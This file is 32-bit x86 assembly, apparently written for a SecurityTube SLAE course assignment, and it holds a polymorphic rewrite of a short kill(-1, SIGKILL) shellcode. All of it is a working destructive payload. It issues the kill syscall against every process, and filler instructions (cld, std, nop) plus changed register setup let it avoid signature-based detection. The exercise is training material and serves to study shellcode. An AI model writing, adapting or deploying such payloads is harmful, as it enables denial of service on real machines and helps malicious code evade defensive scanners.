; John
; Original author: Kris Katterjohn
; Polymorphic Shellcode - Assignment 6
;
; SecurityTube Linux Assembler Expert (SLAE) 32-bit
;
; November 14, 2020

; original size: 11 bytes
; kill(-1, SIGKILL)
; grab SIGKILL value with `man 7 signal`

section .text

_start:
	push byte 38
	pop eax         ; eax = 38
	dec eax		; eax = sys_kill syscall
	cld		; clear direction flag
	push byte -1
	pop ebx         ; ebx = 0xff. Send kill() to all processes
	push byte 8
	pop ecx		; ecx = 8
	inc ecx		; ecx = SIGKILL
	std		; set direction flag
	nop		; junk
	int 0x80	; syscall
